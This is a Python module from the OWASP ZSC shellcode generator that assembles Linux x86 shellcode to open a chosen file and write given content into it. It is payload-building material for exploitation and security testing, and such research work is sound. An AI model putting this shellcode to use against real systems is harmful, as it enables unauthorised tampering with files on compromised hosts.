#!/usr/bin/env python
'''
OWASP ZSC | ZCR Shellcoder
https://www.owasp.org/index.php/OWASP_ZSC_Tool_Project
https://github.com/Ali-Razmjoo/OWASP-ZSC
http://api.z3r0d4y.com/
https://lists.owasp.org/mailman/listinfo/owasp-zsc-tool-project [ owasp-zsc-tool-project[at]lists[dot]owasp[dot]org ]
'''
import binascii
from core import stack
from lib.opcoder.linux_x86 import convert
def write(null,file_name,content,length):
	return '''
push   $0x5
pop    %%eax
%s
%s
mov    %%esp,%%ebx
push   $0x4014141
pop    %%ecx
shr    $0x10,%%ecx
int    $0x80
mov    %%eax,%%ebx
push   $0x4
pop    %%eax
%s
mov %%esp,%%ecx
%s
int    $0x80
mov    $0x1,%%al
mov    $0x1,%%bl
int    $0x80
'''%(str(null),str(file_name),str(content),str(length))
def run(data):
	path_file,content=data[0],data[1]
	null = len(path_file) % 4
	if null is not 0:
		null = ''
	if null is 0:
		null = 'xor %ebx,%ebx\npush %ebx\n'
	return write(str(null),stack.generate(str(path_file),'%ebx','string'),stack.generate(str(content),'%ecx','string'),stack.generate(str(len(content)),'%edx','int'))